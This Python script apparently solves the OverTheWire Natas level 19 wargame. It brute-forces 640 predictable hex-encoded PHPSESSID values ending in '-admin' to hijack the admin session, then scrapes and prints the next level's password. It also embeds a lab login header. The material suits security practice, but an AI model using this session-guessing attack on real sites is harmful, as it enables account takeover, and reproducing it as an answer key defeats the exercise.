

import binascii
import requests
import re

username = 'admin'
for i in range(1, 640+1):
    phpsessid = binascii.hexlify(bytearray(str(i) + "-" + username, 'utf-8')).decode('utf-8') # result is a HEX string, i.e. "3330312d61646d696e"
    print("Attempting PHPSESSID: " + binascii.unhexlify(phpsessid).decode('utf-8'))

    r = requests.get(
        'http://natas19.natas.labs.overthewire.org/index.php',
        headers={
            'Host' :'natas19.natas.labs.overthewire.org',
            'Authorization' : 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
            'Referer' : 'http://natas19.natas.labs.overthewire.org/'
        },
        cookies={
            'PHPSESSID' : phpsessid # 'bytes' is not accepted here. We want 'string'
        },
        proxies={
            'http' : '127.0.0.1:8090',
            'https' : '127.0.0.1:8090'
        }
    )

    if "You are logged in as a regular user." not in r.text:
        print('PHPSESSID ' + phpsessid + ' corresponds to user "admin"')

        match = re.search(r'^Password: ([a-zA-Z0-9]+)</pre>.*', r.text, re.MULTILINE)
        if match:    
            print("")
            print("Credentials for Natas level20")
            print("UN: natas20")
            print("PW: " + match.groups()[0])
            print("")
        break

